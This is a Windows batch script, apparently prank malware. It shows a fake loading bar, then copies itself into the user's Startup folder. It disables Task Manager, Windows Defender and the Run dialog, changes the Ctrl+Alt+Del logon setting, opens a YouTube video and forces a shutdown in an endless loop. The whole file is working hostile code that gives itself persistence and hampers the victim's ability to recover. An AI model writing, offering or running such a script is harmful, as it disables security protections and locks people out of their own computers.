@echo off
color 05
@echo [          ]
TIMEOUT /T 1
cls
@echo [::        ]
TIMEOUT /T 1
cls
@echo [::::      ]
TIMEOUT /T 1
cls
@echo [::::::    ]
TIMEOUT /T 1
cls
@echo [::::::::  ]
TIMEOUT /T 1
cls
@echo [::::::::::]
pause
:StartLoop
@echo payload launch
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f.
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 0 /f
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DisableCAD /t REG_DWORD /d 1 /f
start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ
shutdown /s /f /t 4
goto :StartLoop
